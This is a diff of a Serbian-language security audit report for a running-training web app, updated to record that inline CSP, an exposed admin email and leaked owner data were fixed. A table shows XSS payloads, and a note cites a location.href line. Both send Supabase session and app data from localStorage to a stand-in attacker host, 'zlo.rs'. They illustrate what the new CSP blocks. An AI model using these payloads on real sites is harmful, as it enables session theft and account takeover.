@@ -5,6 +5,13 @@
 **Metod:** ofanzivni — svaki nalaz je **izveden napad**, ne teorijska primedba
 **Testovi:** 110 → **149** (39 novih, svi bezbednosni)
 
+> **Dopuna, verzija 150 · 195 testova.** Izveštaj je pisan na v141 i tekst ispod opisuje stanje u tom trenutku. Od tada su zatvorene još tri stvari, pa su odgovarajući odeljci ispod označeni: **ZATVORENO**.
+> 1. **`unsafe-inline` u CSP** — kod je izdvojen u `app.js`, `script-src` je sada `'self'`. Ubačena skripta se više ne izvršava ni ako provera unosa propusti. (v. „Ostaje otvoreno / 3")
+> 2. **`ADMIN_EMAIL` u javnom kodu** — zamenjen poređenjem po Supabase ID-u naloga. (v. „Ostaje otvoreno / 2")
+> 3. **Lični plan i istorija vlasnika** — više se ne isporučuju u kodu i ne stižu ni do jednog drugog naloga; `uskladiVlasnickePodatke()` ih uklanja i pri pokretanju i posle povlačenja sa servera.
+>
+> I dalje otvoreno: rate-limit na `/api/wellness` i `/api/workouts` (traži novu Supabase tabelu — tvoja strana).
+
 ---
 
 ## Rezime
@@ -45,7 +52,9 @@ Pet mesta gde u aplikaciju ulazi podatak koji ona ne kontroliše:
 
 **Zašto je XSS najteži ishod, a ne „samo iskačući prozor":** `localStorage` drži Supabase sesiju (`sub19_sb`), Strava access + refresh token i intervals.icu token. Jedan uspešan `<img onerror>` uzima sve troje. Supabase sesija znači potpuno preuzimanje naloga; intervals.icu token po njihovoj dokumentaciji **ne ističe**.
 
-**CSP ne spašava.** Aplikacija **jeste** jedna velika inline skripta, pa `script-src` mora da dozvoli `'unsafe-inline'` — ubačena skripta se izvršava. CSP ipak nije beskoristan: `connect-src 'self' supabase strava` blokira `fetch()` ka napadačevom serveru, a `img-src 'self' data:` blokira slike-svetionike. Ali **ne blokira odlazak na drugu adresu** (`location.href='https://zlo.rs/?t='+token`), pa je izvlačenje podataka i dalje moguće. Dakle CSP smanjuje, ne uklanja — jedina prava odbrana je da injekcije nema.
+**CSP ne spašava** *(važilo do v150 — v. „Ostaje otvoreno / 3", sada je zatvoreno)*. Aplikacija je tada bila jedna velika inline skripta, pa je `script-src` morao da dozvoli `'unsafe-inline'` — ubačena skripta se izvršava. CSP ni tada nije bio beskoristan: `connect-src 'self' supabase strava` blokira `fetch()` ka napadačevom serveru, a `img-src 'self' data:` blokira slike-svetionike. Ali **nije blokirao odlazak na drugu adresu** (`location.href='https://zlo.rs/?t='+token`), pa je izvlačenje podataka bilo moguće. Otuda zaključak koji je važio u trenutku analize: CSP smanjuje, ne uklanja — jedina prava odbrana je da injekcije nema.
+
+Napadi u ovom izveštaju su izvedeni pod **tim** uslovima i svi su zatvoreni na izvoru, na nivou koda. Od v150 postoji i drugi sloj: kod je u `app.js`, `script-src` je `'self'`, pa se ubačena skripta više ne izvršava ni ako provera unosa negde propusti.
 
 ---
 
@@ -190,21 +199,39 @@ https://sub-19.vercel.app/**
 ```
 Bez toga Supabase odbacuje `redirect_to` sa upitom i vraća na Site URL — prijava bi pukla za sve korisnike. Reci kad dodaš, pa primenim kod.
 
-### 2. `ADMIN_EMAIL` u javnom kodu
+### 2. ~~`ADMIN_EMAIL` u javnom kodu~~ — ZATVORENO
 
-`index.html:6979`. Bezbednosno bezopasno (server proverava adresu iz tokena, klijent samo odlučuje da li da prikaže dugme), ali je adresa izložena skreperima. Ispravka je poređenje po Supabase `userId` — pošalji ga i menjam.
+Adrese više nema u klijentskom kodu. Prepoznavanje vlasnika ide preko Supabase ID-a naloga (`ADMIN_UID` + `jeVlasnik()`), a test „mejl adresa vlasnika nije u klijentskom kodu" pada ako se vrati. Politika privatnosti **zadržava** kontakt adresu — to je obaveza, ne propust, i za to postoji zaseban test.
 
-### 3. `unsafe-inline` u CSP
+### 3. ~~`unsafe-inline` u CSP~~ — ZATVORENO u v150
 
-Neizbežno dok je aplikacija jedan inline `<script>`. Uklonilo bi se izdvajanjem skripte u zaseban fajl + `script-src 'self'`, što je deo šireg refaktora (menja način deploya). Do tada `connect-src` ograničava izvlačenje na `fetch`, ali ne i na navigaciju.
+Bio je neizbežan dok je aplikacija bila jedan inline `<script>`. U v150 je telo skripte izdvojeno u `app.js`, a CSP je sada `script-src 'self'` — bez `'unsafe-inline'`.
+
+Kod nije menjan: `git show <v149>:index.html | sed -n '590,8640p' | diff - app.js` daje tačno jednu razliku, `APP_VERSION 149 → 150`.
+
+Šta se time dobija — pregledač od sada **odbija da izvrši** sve ovo, bez obzira kako je dospelo u HTML:
+
+| Ubačeno | Pre (v149) | Sada (v150) |
+|---|---|---|
+| `<img src=x onerror="fetch('https://zlo.rs/?t='+localStorage.sub19_sb)">` | izvršava se | **blokirano** |
+| `<script>navigator.sendBeacon('https://zlo.rs',localStorage.sub19_v1)</script>` | izvršava se | **blokirano** |
+| `<svg onload=alert(1)>` | izvršava se | **blokirano** |
+| `<iframe src="javascript:…">` | izvršava se | **blokirano** |
+| `<body onpageshow="location='https://zlo.rs/?'+…">` | izvršava se | **blokirano** |
+
+Ovo je **druga, nezavisna linija odbrane**. Prva (provera i escapovanje unosa) i dalje stoji i dalje je primarna — ali od sada jedna propuštena tačka više ne znači automatski preuzet nalog. Time pada i ograda iz odeljka „CSP ne spašava" gore: navigacija na tuđu adresu je bila moguća baš zato što je ubačeni kod mogao da se izvrši; sada ne može.
+
+`style-src 'unsafe-inline'` **ostaje namerno** — `<style>` blok i `style="…"` atributi su i dalje inline, a ubačen stil ne izvršava kod.
+
+Uslov se čuva testovima: `script-src` ne sme sadržati `'unsafe-inline'`; nijedna od tri HTML stranice ne sme imati `<script>` sa telom, `on*=` atribut ni `javascript:` URL; `index.html` mora učitavati `./app.js`; `app.js` mora biti u `ASSETS` u `sw.js` (inače bi se logika servirala iz starog keša).
 
 ### 4. Nema rate-limita na `/api/wellness` i `/api/workouts`
 
 Prijavljen korisnik može kroz tvoj server neograničeno gađati intervals.icu (tvoja IP adresa nosi posledice). Traži novu Supabase RPC funkciju i tabelu — dakle izmenu na tvojoj strani, pa nisam dirao.
 
-### 5. `ICU_REDIRECT_URI`
+### 5. `ICU_REDIRECT_URI` — postavljeno, uz sitnu napomenu
 
-I dalje nije postavljen; bez njega se `redirect_uri` gradi iz `x-forwarded-host` zaglavlja. Nije iskoristivo (intervals.icu proverava prema registrovanom), ali vredi zatvoriti — vrednost sam ti dao ranije.
+Postavljeno je na Vercelu. Jedina primedba je kozmetička: dodato je i za Preview okruženje, gde adresa nije ista kao produkcijska, pa tamo ne odgovara. Ako ne testiraš OAuth na preview deploy-ovima, nema posledica.
 
 ---
 
@@ -212,12 +239,22 @@ I dalje nije postavljen; bez njega se `redirect_uri` gradi iz `x-forwarded-host`
 
 Ista granica kao u prethodnom izveštaju, ponovo mašinski provereno posle svih bezbednosnih izmena:
 
-| Vrednost | Pre svih izmena | Sada |
+| Vrednost | Pre svih izmena | Sada (v150) |
 |---|---|---|
 | START / RACE | 2026-06-22 / 2026-09-24 | isto |
+| CILJ | 19:20–19:30 | isto |
+| Nedelja u planu | 14 | isto |
 | Ukupno km / treninga | 533,7 / 72 | isto |
 | VDOT početni / ciljni | 48,1 / 51,3 | isto |
 | PRED / QS | 25 / 24 | isto |
+| WT_TARGET (14 merenja) | 82 → 75,5 kg | isto |
+
+Izdvajanje koda u `app.js` u v150 nije moglo ovo da promeni ni slučajno, i to je provereno bajt po bajt, ne na oko:
+
+```bash
+git show 0dfed1b~1:index.html | sed -n '590,8640p' | diff - app.js
+# jedina razlika: APP_VERSION 149 -> 150
+```
 
 `LS_KEY`, `SB_KEY`, prefiks `sub19-` za intervals.icu događaje, `BAZA`, env varijable, Supabase tabele i RPC-jevi, Resend — **ništa od toga nije menjano i ništa ne treba da podešavaš.**
 
@@ -226,5 +263,5 @@ Ista granica kao u prethodnom izveštaju, ponovo mašinski provereno posle svih 
 ## Provera
 
 ```bash
-node --test "test/**/*.test.mjs"     # 149 testova
+node --test "test/**/*.test.mjs"     # 195 testova
 ```
